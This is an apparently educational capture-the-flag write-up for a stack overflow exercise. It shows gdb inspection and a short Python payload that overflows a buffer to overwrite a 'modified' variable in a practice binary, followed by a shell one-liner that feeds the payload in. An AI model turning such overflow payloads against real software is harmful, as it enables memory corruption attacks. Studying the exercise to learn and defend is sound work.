## ex00

### Objective
The goal of this challenge is to change the `modified` variable and see the success message "you have changed the 'modified' variable".

### Steps Taken

1. **Initial Analysis**:
    - Used `file` to determine the type of the binary.
    - Used `strings` to identify useful strings within the binary.

    ```sh
    file bin
    strings bin
    ```

2. **Disassembly**:
    - Used `gdb` to disassemble the binary and identify the `gets` function call, which is vulnerable to buffer overflow.

    ```sh
    gdb bin
    ```

3. **Debugging with GDB**:
    - Set breakpoints and inspected the stack to determine the buffer size and the location of the `modified` variable.

    ```sh
    break main
    run
    info registers
    x/32x $esp
    ```

4. **Crafting the Payload**:
    - Used a Python script to craft a payload that overflows the buffer and modifies the `modified` variable.

    ```python
    import struct

    buffer_size = 116
    new_value = 1

    payload = b'A' * buffer_size
    payload += struct.pack("<I", new_value)

    # Print the payload
    print(payload.decode('latin-1'))
    ```

5. **Execution**:
    - Provided the payload to the binary to achieve the objective.

    ```sh
    echo -e $(python -c 'import struct; buffer_size = 116; new_value = 1; payload = b"A" * buffer_size + struct.pack("<I", new_value); print(payload.decode("latin-1"))') | ./bin
    ```

### Tools Used
- `file`
- `strings`
- `gdb`
- Python

### Educational Purpose
These methods and tools are used strictly for educational purposes to understand and protect against similar vulnerabilities. 

### Script
Include the Python script used to generate the payload:

```python
import struct
```

buffer_size = 116
new_value = 1

payload = b'A' * buffer_size
payload += struct.pack("<I", new_value)

# Print the payload
print(payload.decode('latin-1'))

